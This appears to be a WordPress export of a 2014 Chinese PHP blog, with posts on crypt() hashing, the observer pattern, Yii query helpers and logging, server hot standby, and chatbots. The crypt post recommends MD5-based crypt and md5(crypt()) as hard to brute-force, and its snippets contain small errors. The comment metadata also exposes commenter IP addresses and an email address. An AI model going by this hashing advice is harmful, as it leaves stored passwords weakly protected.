PHP中有几个常量，分别是CRYPT_STD_DES 、CRYPT_EXT_DES、CRYPT_MD5、CRYPT_BLOWFISH、CRYPT_SHA256、CRYPT_SHA512。这些常量不是1就是0，也意味着其所对应的算法是否可用。
我们可以看一下下面代码的输出结果：
<pre class="lang:php decode:true">if (CRYPT_STD_DES == 1) {
    echo 'Standard DES: ' . crypt('rasmuslerdorf', 'rl') . "&lt;br&gt;";
}
if (CRYPT_EXT_DES == 1) {
    echo 'Extended DES: ' . crypt('rasmuslerdorf', '_J9..rasm') . "&lt;br&gt;";
}
if (CRYPT_MD5 == 1) {
    echo 'MD5:          ' . crypt('rasmuslerdorf', '$1$rasmusle$') . "&lt;br&gt;";
}
if (CRYPT_BLOWFISH == 1) {
    echo 'Blowfish:     ' . crypt('rasmuslerdorf', '$2a$07$usesomesillystringforsalt$') . "&lt;br&gt;";
}
if (CRYPT_SHA256 == 1) {
    echo 'SHA-256:      ' . crypt('rasmuslerdorf', '$5$rounds=5000$usesomesillystringforsalt$') . "&lt;br&gt;";
}
if (CRYPT_SHA512 == 1) {
    echo 'SHA-512:      ' . crypt('rasmuslerdorf', '$6$rounds=5000$usesomesillystringforsalt$') . "&lt;br&gt;";
}</pre>
输出结果：
<pre class="theme:ado lang:xhtml decode:true">Standard DES: rl.3StKT.4T8M
Extended DES: _J9..rasmBYk8r9AiWNc
MD5: $1$rasmusle$rISCgZzpwk3UhDidwXvin0
Blowfish: $2a$07$usesomesillystringfore2uDLvp1Ii2e./U9C8sBjqp8I90dH6hi
SHA-256: $5$rounds=5000$usesomesillystri$KqJWpanXZHKq2BOB43TSaYhEWsQ1Lr5QNyPCDH/Tp.6
SHA-512: $6$rounds=5000$usesomesillystri$D4IrlXatmP7rx3P3InaxBeoomnAihCKRVQP22JZ6EY47Wc6BkroIuUUBOov1i.S5KPgErtP/EN5mcO.ChWQW21</pre>
第一个结果是基于标准 DES 算法的散列，使用 "./0-9A-Za-z" 字符中的两个字符作为盐值，本例中使用了"rl"，你可以试一下添加更多字符如"rlsdfs"，输出结果还是不变的。手册中说，如果不提供salt，默认使用该算法，但我试过之后发现是使用的下面md5。
第二个结果是扩展的基于 DES 算法的散列。其盐值为 9 个字符的字符串，由 1 个下划线后面跟着 4 字节循环次数和 4 字节盐值组成。它们被编码成可打印字符，每个字符 6 位，有效位最少的优先。0 到 63 被编码为 "./0-9A-Za-z"。
第三个结果就是使用了md5后的散列，使用一个以 $1$ 开始的 12 字符的字符串盐值。
第四个Blowfish 算法使用如下盐值：“$2a$”，一个两位 cost 参数，“$” 以及 64 位由 “./0-9A-Za-z” 中的字符组合而成的字符串。在盐值中使用此范围之外的字符将导致 crypt() 返回一个空字符串。两位 cost 参数是循环次数以 2 为底的对数，它的范围是 04-31，超出这个范围将导致 crypt() 失败。
第五个结果是 SHA-256 算法，使用一个以 $5$ 开头的 16 字符字符串盐值进行散列。如果盐值字符串以 “rounds=&lt;N&gt;$” 开头，N 的数字值将被用来指定散列循环的执行次数，这点很像 Blowfish 算法的 cost 参数。默认的循环次数是 5000，最小是 1000，最大是 999,999,999。超出这个范围的 N 将会被转换为最接近的值。
第六个是 SHA-512 算法，使用一个以 $6$ 开头的 16 字符字符串盐值进行散列。如果盐值字符串以 “rounds=&lt;N&gt;$” 开头，N 的数字值将被用来指定散列循环的执行次数，这点很像 Blowfish 算法的 cost 参数。默认的循环次数是 5000，最小是 1000，最大是 999,999,999。超出这个范围的 N 将会被转换为最接近的值。
<hr />
大致的了解了一下crypt几种散列类型，但最终如何应用？
使用crypt加密就是为了即使加密列表落入他人手中，也无法获得其明文，因为该加密是不可逆的。
单纯的使用<span style="color: #ff0000;">crypt($input_pwd)</span><span style="color: #333333;">会生成不同的随机值。（本人在win系统和centos上获得的都是基于md5的散列值，即$1$开头的随机值）</span>
使用crypt加密方式有很多，你或许可以使用：
<pre class="lang:php decode:true">&lt;?php
$pwd = 'veitor';		//注册密码明文
crypt($pwd);
?php</pre>
将注册密码明文用crypt随机生成的散列值存入数据库。
验证登陆时：
<pre class="lang:php decode:true">&lt;?php
$input_pwd = 'veitor';		      //表单输入密码明文
crypt($input_pwd, $pwd) == $pwd       //$pwd为上一步数据库中的加密暗文
?&gt;</pre>
你需要使用库中的加密暗文作为salt，这样做是指定crypt使用的散列类型。比如我上一步注册生成的暗文是基于MD5的，则暗文以$1$开头多位字符串，那么在这一步中，使用该暗文作为salt，crypt判断$1$就知道使用的散列类型是md5了。（另外，改成crypt($input_pwd, sub_str($pwd,0,12)) == $pwd也是正确的，因为基于md5散列时，salt只使用到前12个字符）
当然你还可以使用crypt和md5两个函数的结合，使得密码更安全，如md5(crypt($pwd))这种方式，生成后的依旧是32位字符，初看就以为是md5加密而已，即使再庞大的数据系统也难以进行暴力破解。
以上只是本人的一点小理解，或许存在偏差，如果你有更好的想法，不妨留个言一起探讨。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>86</wp:post_id>
		<wp:post_date><![CDATA[2014-05-10 08:33:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-05-10 08:33:05]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%ba%86%e8%a7%a3php%e4%b8%adcrypt%e5%8a%a0%e5%af%86%e5%87%bd%e6%95%b0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="crypt"><![CDATA[crypt]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="%e5%8a%a0%e5%af%86"><![CDATA[加密]]></category>
						</item>
					<item>
		<title>了解PHP设计模式之观察者模式</title>
		<link>http://wp.veitor.net/2014/05/11/%e4%ba%86%e8%a7%a3php%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f%e4%b9%8b%e8%a7%82%e5%af%9f%e8%80%85%e6%a8%a1%e5%bc%8f/</link>
		<pubDate>Sun, 11 May 2014 04:22:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=91</guid>
		<description></description>
		<content:encoded><![CDATA[观察者模式是一种事件系统，意味着这一模式允许某个类观察另一个类的状态，当被观察的类状态发生改变的时候，观察类可以收到通知并且做出相应的动作，观察者模式提供了避免组件之间紧密耦合的另一种方式。
在观察者模式中，被观察者称为subject,观察者称为observer,为了表达这些内容，SPL（Standard PHP Libaray）提供了SplSubject(被观察者)和SplObserver(观察者)两个接口。在编写观察者模式时，只要实现这两个接口即可。接口如下：
<pre class="lang:php decode:true "> //被观察者接口
interface SplSubject{
   public function attach(SplObserver $observer);//注册观察者（注册的观察者：当我（被观察者）的某个状态改变时，需要通知的对象）
   public function detach(SplObserver $observer);//释放观察者
   public function notify();//通知所有注册的观察者的方法
}
  //观察者接口
  interface SplObserver{
   public function update(SplSubject $subject);//观察者进行更新状态
  }</pre>
这一模式的概念是SplSubject类维护了一个特定状态，当这个状态发生变化时，它就会调用notify()方法。调用notify()方法时，所有之前使用attach()方法注册的SplObserver实例的update方法都会被调用。
以下是实现代码：
<pre class="lang:php decode:true">  &lt;?php
//被观察者实现类
class DemoSubject implements SplSubject {
  private $observers;    //存放观察者的类
  private $value;
  public function __construct() {
    $this-&gt;observers = array();
  }
//注册观察者
  public function attach(SplObserver $observer) {
    $this-&gt;observers[] = $observer;
  }
 //释放观察者
  public function detach(SplObserver $observer) {
    if($idx = array_search($observer,$this-&gt;observers,true)) {
      unset($this-&gt;observers[$idx]);
    }
  }
 //通知所有观察者，执行观察者类中的update方法
  public function notify() {
    foreach($this-&gt;observers as $observer) {
      $observer-&gt;update($this);
    }
  }
/*设置状态，当状态发生任何变化时，都会调用notify方法通知所有的观察者，即调用观察者类中的update方法*/
  public function setState($value) {
    $this-&gt;value = $value;
    $this-&gt;notify();
  }
//
  public function getValue() {
    return $this-&gt;value;
  }
}
//观察者简单类
class DemoObserver implements SplObserver {
  //接收被观察者发送的通知
  public function update(SplSubject $subject) {
    echo 'The new value is '. $subject-&gt;getValue();
  }
}
$subject = new DemoSubject();//初始化被观察者
$observer = new DemoObserver();//初始化一个观察者
$subject-&gt;attach($observer);//添加一个观察者
$subject-&gt;setState(5);//被观察者修改状态。
?&gt;;</pre>
输出结果为：
The new value is 5
观察者模式的优点在于，挂接到被观察者上的观察者可多可少，并且不需要提前知道哪个观察者会响应被观察者发出的响应事件。
这种设计模式在很多PHP框架中都被使用到，如Yii等。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>91</wp:post_id>
		<wp:post_date><![CDATA[2014-05-11 04:22:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-05-11 04:22:54]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%ba%86%e8%a7%a3php%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f%e4%b9%8b%e8%a7%82%e5%af%9f%e8%80%85%e6%a8%a1%e5%bc%8f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="sjms"><![CDATA[设计模式]]></category>
		<category domain="post_tag" nicename="%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f"><![CDATA[设计模式]]></category>
						</item>
					<item>
		<title>Yii的CDbCriteria中addSearchCondition与compare的区别</title>
		<link>http://wp.veitor.net/2014/05/22/yii%e7%9a%84cdbcriteria%e4%b8%adaddsearchcondition%e4%b8%8ecompare%e7%9a%84%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Thu, 22 May 2014 03:36:27 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=95</guid>
		<description></description>
		<content:encoded><![CDATA[在使用Yii过程中发现CDbCriteria类中addSearchCondition与compare的功能似乎都是用于增加搜索条件的，但仔细看其代码之后还是有区别的。
这里我就讲一下使用方法吧，不讲原理了，讲原理要分析其代码涉及很多。
<h1><span style="color: #ff0000;">addSearchCondition</span>第一个参数为搜索的字段名</h1>
第二个参数为搜索关键词
第三个参数是设置是否过滤掉你关键词中的“%"百分号和”_“下划线这两个通配符，默认是true，即过滤这两个通配符，并在关键词前后自动加上"%"以进行匹配。第四个参数就是条件连接符，默认为AND，最后一个是Sql 关键字”LIKE"，还可以设置为“NOT LIKE"。基本上最后两个参数都不需要自己设置，都使用默认值就好了。
<strong>addSearchCondition就大致理解为增加一个LIKE搜索条件即可。</strong>
<h1><span style="color: #ff0000;">compare</span></h1>
第一个参数一样为搜索的字段名
第二个参数也是关键词，但不同点也在于此，你可以在关键词开头加"&lt;"、"&gt;"、"&lt;="、"&gt;="、"&lt;&gt;"这四个比较符号，组成的sql语句就类似[字段名][比较符号][搜索关键词]，如我搜一个商品价格小于5的东西就这么写：compare('price','&lt;5')，查询相当于这样"price &lt; 5"，它会自动提取开头的比较符号，如果你没写比较符号，那默认的就是"="等于符号，写成这样compare('price','5')就相当于'price=5'这种效果。
第三个参数是开启模糊匹配，默认是false关闭的，开启后，会调用上面的addSearchCondition方法，也就又使用了LIKE。compare('price','5',true)即price LIKE %5%，compare('price','&lt;&gt;5',true)即price NOT LIKE %5%，如果使用其他比较符号如compare('price','&lt;=5',true)、compare('price','&gt;5',true)等，使不会增加addSearchCondition的。
第四个参数是条件连接符AND，当然可以设置为其他的。
第五个参数是设置addSearchCondition中第三个条件的，当然你前面的参数要确保能调用addSearchCondition这个方法。
<strong>compare可以这么理解，相当于使用"&lt;"、"&gt;"、"&lt;="、"&gt;="、"&lt;&gt;"来比较值，启用模糊匹配就使用LIKE方式。</strong>
&nbsp;
差不多就是这些吧，如果还有不明白的可以提出，我再讲细一点。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>95</wp:post_id>
		<wp:post_date><![CDATA[2014-05-22 03:36:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-05-22 03:36:27]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[yii%e7%9a%84cdbcriteria%e4%b8%adaddsearchcondition%e4%b8%8ecompare%e7%9a%84%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="yii"><![CDATA[Yii]]></category>
						</item>
					<item>
		<title>了解Yii中Log日志机制</title>
		<link>http://wp.veitor.net/2014/05/27/%e4%ba%86%e8%a7%a3yii%e4%b8%adlog%e6%97%a5%e5%bf%97%e6%9c%ba%e5%88%b6/</link>
		<pubDate>Tue, 27 May 2014 05:38:20 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=97</guid>
		<description></description>
		<content:encoded><![CDATA[想要知道用户在你的程序中做了些什么，我们可以通过用日志的形式记录下来，前提是用户是做的跟数据库有关的操作。我们可以在任何时候进行的增删改操作都可以记录下来，对于Yii中的AR模型我们可以使用behavior（行为）来达到此目的，这样很容易的就可以把日志功能加到AR类里。
首先我们需要建一张日志表：
<pre class="lang:mysql decode:true">CREATE TABLE ActiveRecordLog (
  id INTEGER UNSIGNED NOT NULL AUTO_INCREMENT,
  description VARCHAR(255) NULL,
  action VARCHAR(20) NULL,
  model VARCHAR(45) NULL,
  idModel INTEGER UNSIGNED NULL,
  field VARCHAR(45) NULL,
  creationdate TIMESTAMP NOT NULL,
  userid VARCHAR(45) NULL,
  PRIMARY KEY(id)
)
TYPE=InnoDB;</pre>
接着我们就需要建立相应的model，可以使用gii或者shell工具等。
为了记录用户操作，我们需要创建一个behavior类，一般放在protected/behavior目录下，该类必须继承CActiveRecordBehavior类。
<pre class="lang:php decode:true crayon-selected">class ActiveRecordLogableBehavior extends CActiveRecordBehavior
{
    private $_oldattributes = array();
    /**
     * save操作
     * @param  [type] $event [description]
     * @return [type]        [description]
     */
    public function afterSave($event)
    {
        //非新记录，即非插入
        if (!$this-&gt;Owner-&gt;isNewRecord) {
            $newattributes = $this-&gt;Owner-&gt;getAttributes();             //获得AR类中已修改的各字段值
            $oldattributes = $this-&gt;getOldAttributes();                 //之前的旧数据
            //比较新旧数据
            foreach ($newattributes as $name =&gt; $value) {
                if (!empty($oldattributes)) {
                    $old = $oldattributes[$name];
                } else {
                    $old = '';
                }
                //如果该字段旧数据与新数据不一样，则进行记录
                if ($value != $old) {
                    //$changes = $name . ' ('.$old.') =&gt; ('.$value.'), ';
                    $log=new ActiveRecordLog;                                               //实例log对象
                    $log-&gt;description=  'User ' . Yii::app()-&gt;user-&gt;Name                    //设置日志内容格式，描述具体操作
                                            . ' changed ' . $name . ' for '
                                            . get_class($this-&gt;Owner)
                                            . '[' . $this-&gt;Owner-&gt;getPrimaryKey() .'].';
                    $log-&gt;action=       'CHANGE';                                           //设置操作类型为“修改”
                    $log-&gt;model=        get_class($this-&gt;Owner);
                    $log-&gt;idModel=      $this-&gt;Owner-&gt;getPrimaryKey();                      //获得修改的记录的主键
                    $log-&gt;field=        $name;                                              //修改的字段名
                    $log-&gt;creationdate= new CDbExpression('NOW()');                         //日志生成时间
                    $log-&gt;userid=       Yii::app()-&gt;user-&gt;id;                               //记录用户id
                    $log-&gt;save();                                                           //保存日至到数据库
                }
            }
        } else {//新纪录直接保存操作日志入库
            $log=new ActiveRecordLog;
            $log-&gt;description=  'User ' . Yii::app()-&gt;user-&gt;Name
                                    . ' created ' . get_class($this-&gt;Owner)
                                    . '[' . $this-&gt;Owner-&gt;getPrimaryKey() .'].';
            $log-&gt;action=       'CREATE';
            $log-&gt;model=        get_class($this-&gt;Owner);
            $log-&gt;idModel=      $this-&gt;Owner-&gt;getPrimaryKey();
            $log-&gt;field=        '';
            $log-&gt;creationdate= new CDbExpression('NOW()');
            $log-&gt;userid=       Yii::app()-&gt;user-&gt;id;
            $log-&gt;save();
        }
    }
    /**
     * 删除操作
     * @param  [type] $event [description]
     * @return [type]        [description]
     */
    public function afterDelete($event)
    {
        $log=new ActiveRecordLog;
        $log-&gt;description=  'User ' . Yii::app()-&gt;user-&gt;Name . ' deleted '
                                . get_class($this-&gt;Owner)
                                . '[' . $this-&gt;Owner-&gt;getPrimaryKey() .'].';
        $log-&gt;action=       'DELETE';
        $log-&gt;model=        get_class($this-&gt;Owner);
        $log-&gt;idModel=      $this-&gt;Owner-&gt;getPrimaryKey();
        $log-&gt;field=        '';
        $log-&gt;creationdate= new CDbExpression('NOW()');
        $log-&gt;userid=       Yii::app()-&gt;user-&gt;id;
        $log-&gt;save();
    }
    public function afterFind($event)
    {
        //保存查询出来的数据
        $this-&gt;setOldAttributes($this-&gt;Owner-&gt;getAttributes());
    }
    public function getOldAttributes()
    {
        return $this-&gt;_oldattributes;
    }
    public function setOldAttributes($value)
    {
        $this-&gt;_oldattributes=$value;
    }
}</pre>
该behavior行为类中需要使用到ActiveRecordLo类来将日志记录到数据库中，它会为为每次插入、删除记录一条日志，也会为修改的每个字段记录一条日志。
设定的行为已经写好了，那么剩下的就是需要将其绑定到对应的model模型上。我们只需在对应的model里加入以下方法就完成绑定了：
<pre class="lang:php decode:true">public function behaviors()
{
    return array(
        // 行为类名 =&gt; 类文件别名路径
        'ActiveRecordLogableBehavior'=&gt;
            'application.behaviors.ActiveRecordLogableBehavior',
    );
}</pre>
&nbsp;
当然这些都是最基本的简单的记录日志操作，你还可以进行扩展，以满足更高级更多功能的需求。如有问题，留言探讨~
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>97</wp:post_id>
		<wp:post_date><![CDATA[2014-05-27 05:38:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-05-27 05:38:20]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%ba%86%e8%a7%a3yii%e4%b8%adlog%e6%97%a5%e5%bf%97%e6%9c%ba%e5%88%b6]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="yii"><![CDATA[Yii]]></category>
						<wp:comment>
			<wp:comment_id>6</wp:comment_id>
			<wp:comment_author><![CDATA[銮仪使]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://weibo.com/2703320947</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[114.94.255.43]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-04-30 06:29:24]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-04-30 06:29:24]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[为什么新增是有效果，但是删除和修改没有效果]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>7</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.160.251.57]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-06-02 09:07:28]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-06-02 09:07:28]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[你会不会是在AR类里重写了afterDelete之类的事件吧？]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>6</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>什么是双机热备 ？</title>
		<link>http://wp.veitor.net/2014/05/27/%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8c%e6%9c%ba%e7%83%ad%e5%a4%87/</link>
		<pubDate>Tue, 27 May 2014 07:16:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=99</guid>
		<description></description>
		<content:encoded><![CDATA[什么是双机热备技术？双机热备，英文”Hot Standby“，是一种常见的服务器高可用技术。顾名思义，A，B两台机器互相做备份，A歇菜了B顶上，B歇菜了A顶上。
<img src="http://storage.veitor.net/2016/03/757275038.jpg" alt="showimage-10057963-10009581-c4d4df6cba4fb6fcf79206c9c6fcb774.jpg" />
双机热备典型应用环境就是：
对于关键性的业务系统，需要有两台或两台以上的服务器完成相同的功能，共同执行同一服务，让它们具有相同的配置，彼此互为备用，当一台服务器出现故障时，不需要人工介入，可以由另一台服务器自动接替工作，保证系统持续运转，实现高可用性。
双机热备的工作模式有三种
根据两台服务器的工作方式可以有三种不同的工作模式，即双机主从模式、双机互备模式和双机双工模式。下面分别予以简单介绍：
双机主从模式
最常见的双机热备模式，即目前通常所说的active/standby 方式，active服务器处于工作状态；而standby服务器处于监控准备状态。当active服务器出现故障的时候，通过软件诊测或手工方式将standby机器激活，保证应用在短时间内完全恢复正常使用。典型应用在证券资金服务器或行情服务器。这是目前采用较多的一种模式，但由于另外一台服务器长期处于后备的状态，从计算资源方面考量，就存在一定的浪费。
双机互备模式
两个相对独立的应用在两台机器同时运行，但彼此均设为备机，当某一台服务器出现故障时，另一台服务器可以在短时间内将故障服务器的应用接管过来，从而保证了应用的持续性，但对服务器的性能要求比较高。服务器配置相对要好。
双机双工模式
目前Cluster（集群）的一种形式，active/active两台服务器均为活动状态，同时运行相同的应用，保证整体的性能，也实现了负载均衡和互为备份。WEB服务器或FTP服务器等用此种方式比较多。
双机热备的实现方式有两种
双机热备有两种实现模式，一种是基于共享的存储设备的方式，另一种是没有共享的存储设备的方式，一般称为纯软件方式。
基于存储共享的双机热备是双机热备的最标准方案。这种方式采用两台（或多台）服务器，使用共享的存储设备（磁盘阵列柜或存储区域网SAN）。两台服务器可以采用热备（主从）、互备、双工（并行）等不同的方式。在工作过程中，两台服务器将以一个虚拟的IP地址对外提供服务，依工作方式的不同，将服务请求发送给其中一台服务器承担。同时，服务器通过心跳线（目前往往采用建立私有网络的方式）侦测另一台服务器的工作状况。当一台服务器出现故障时，另一台服务器根据心跳侦测的情况做出判断，并进行切换，接管服务。对于用户而言，这一过程是全自动的，在很短时间内完成，从而对业务不会造成影响。由于使用共享的存储设备，因此两台服务器使用的实际上是一样的数据，由双机或集群软件对其进行管理。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>99</wp:post_id>
		<wp:post_date><![CDATA[2014-05-27 07:16:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-05-27 07:16:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8c%e6%9c%ba%e7%83%ad%e5%a4%87]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="jiagou"><![CDATA[架构]]></category>
		<category domain="post_tag" nicename="%e6%9e%b6%e6%9e%84"><![CDATA[架构]]></category>
						</item>
					<item>
		<title>智能聊天机器人小黄鸡及其制作方法</title>
		<link>http://wp.veitor.net/2014/06/03/%e6%99%ba%e8%83%bd%e8%81%8a%e5%a4%a9%e6%9c%ba%e5%99%a8%e4%ba%ba%e5%b0%8f%e9%bb%84%e9%b8%a1%e5%8f%8a%e5%85%b6%e5%88%b6%e4%bd%9c%e6%96%b9%e6%b3%95/</link>
		<pubDate>Tue, 03 Jun 2014 13:41:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=103</guid>
		<description></description>
		<content:encoded><![CDATA[<div align="left">　　 今天很荣幸担任主讲，与大家一起讨论智能聊天机器人小黄鸡~讲得不好请见谅，提问请轻虐~嘻嘻</div>
<div align="left">       今天的讲座主要分为三个部分，分别是：<strong>1. 什么是小黄鸡 2.小黄鸡的基本原理 3.如何自制小黄鸡。
</strong></div>
<div align="left"><strong>Part 1 什么是小黄鸡</strong></div>
<div align="left">      很多人认识小黄鸡是从人人网开始的，只要@小黄鸡，它就会跑出来跟你聊天。这就是一个典型的人工智能的聊天机器人。</div>
<div align="left">      实际上，人人网小黄鸡是华科一位08级的同学，通过人人网接口，调用韩国聊天机器人SimSimi的API，自动回复提问者。</div>
<div align="left">也就是下图：</div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/1.png"><img class="aligncenter size-full wp-image-104" alt="1" src="http://storage.veitor.net/uploads/2014/06/1.png" width="656" height="441" /></a></div>
<div align="left">
<div align="left">  SimSimi最早风靡于移动平台。至于它的具体原理以及实现方法我们将在后两部分介绍。也就是说，人人网小黄鸡的原型，就是智能聊天机器人SimSimi。那么什么是聊天机器人呢？</div>
<div align="left">       简单地说，就是基于人工智能原理(Artificial Intelligence，以下简称AI)，通过对聊天文本进行分析后给出应答的一类程序。世界上最早的聊天机器人诞生于20世纪80年代，这款机器人名为“阿尔贝特”，用BASIC语言编写而成。而由于中文对“词”划分的模糊及歧义繁多等等原因，中文聊天机器人发展得相对较慢，目前有赢思的小i，爱博的小A，腾讯也有。
</div>
<strong>Part   2 小黄鸡的基本原理</strong>
<div align="left">       AI聊天机器人小黄鸡的工作可以被分成两个部分：训练+匹配。（其实很多AI的东西都可以被这么划分，比如人脸识别，语音识别等等）
</div>
<strong>2.1 训练</strong>
<div align="left">       Simsimi中的“教学”，就是<strong>训练</strong>的过程，目的在于构建或是丰富词库。</div>
<div align="left">       流程描述如下：
<strong>S1：用户通过教学界面向系统提出一个话题与相应应答；
S2：系统对该话题进行分词，判断该话题在系统知识库中应存放的位置；
S3：在系统知识库中添加该话题及相应应答。
</strong></div>
<div align="left">      可以看到，这里涉及到两个问题：<strong>给出一个话题，系统是如何分词的？词库要如何设计才能又快又准地应答？</strong><strong>
</strong></div>
<strong>2.1.1分词方法</strong>
<div align="left">       有人认为我教小黄鸡“埃菲尔铁塔上45度角仰望星空”回答是“呵呵”，那下次它再看到“埃菲尔铁塔上45度角仰望星空”整句话的时候才会有相应回答。但实际上，下次只要它看到“埃菲尔铁塔”就会“呵呵”了好嘛。</div>
<div align="left">       这是因为聊天机器人的存储并不以句子为单位（那样太费时费空间），而是以词。于是，分词，几乎成为聊天机器人的核心。</div>
<div align="left">      英文分词好说，人家用空格什么的就搞定了，但中文不一样，对于一句话，人们可以用自己的认识区分词语，而机器人要怎么做，就是中文分词算法的研究范畴了。</div>
<div align="left">      中文分词技术俨然是一个重要的研究方向，隶属于自然语言处理。现有的分词算法可以分为三大类：<strong>基于字符串匹配的分词方法</strong>、<strong>基于统计的分词方法</strong>和<strong>基于理解的分词方法</strong>。</div>
<div align="left">      用户在聊天时的一个显著特点是所提出的话题一般都是比较短小的，而不是长篇大论，不具有段落篇章结构，绝大多数就是少数几句话。基于统计的分词方法适用于有段落、篇章结构以及上下文关系的文段。基于理解的分词方法目前并不成熟，且时间复杂度高，速度慢。于是，只有基于字符串匹配的分词是比较适合的。</div>
<div align="left">      基于字符串匹配的分词方法，又叫做机械分词方法。<strong>按照扫描方向</strong>的不同，机械分词法可以分为正向匹配和逆向匹配。（e.g. 字符串“北京华烟云”，正向匹配为《北京，华烟云》，逆向匹配为《北，京华烟云》）逆向匹配的切分正确率要高于正向匹配法，为了便于发现歧义切分，有时候将两者结合起来形成双向匹配法。<strong>按照不同长度优先匹配</strong>的情况，可以分为最大（最长）匹配和最小（最短）匹配，也就是长词优先和短词优先。<strong>按照匹配不成功时重新切取的策略</strong>，机械分词法可以分为增字法和减字法。
